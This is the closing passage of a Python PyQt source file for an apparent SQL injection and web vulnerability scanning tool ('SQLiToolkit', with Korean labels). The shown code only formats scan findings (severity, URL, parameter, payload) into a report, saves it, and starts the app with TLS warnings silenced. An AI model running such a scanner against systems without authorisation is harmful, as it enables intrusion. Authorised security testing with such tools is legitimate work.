        now   = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        url   = self.scan_url_entry.text()
        total = len(self.scan_results)
        self.scan_report.append(f"{'='*50}\n  웹 취약점 진단 결과\n{'='*50}")
        self.scan_report.append(f"  대상  : {url}\n  일시  : {now}\n  총    : {total}개\n")
        for i,r in enumerate(self.scan_results,1):
            self.scan_report.append(
                f"  [{i}] {r['severity']}  {r['type']}\n"
                f"      URL      : {r['url']}\n"
                f"      파라미터 : {r['param']}\n"
                f"      페이로드 : {r['payload']}\n")

    def _save_scan_report(self):
        path, _ = QFileDialog.getSaveFileName(
            self,"리포트 저장",f"scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
            "Text (*.txt);;All (*.*)")
        if path:
            with open(path,"w",encoding="utf-8") as f:
                f.write(self.scan_report.toPlainText())


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    app = QApplication(sys.argv)
    app.setStyleSheet(STYLE)
    win = SQLiToolkit()
    win.show()
    sys.exit(app.exec())
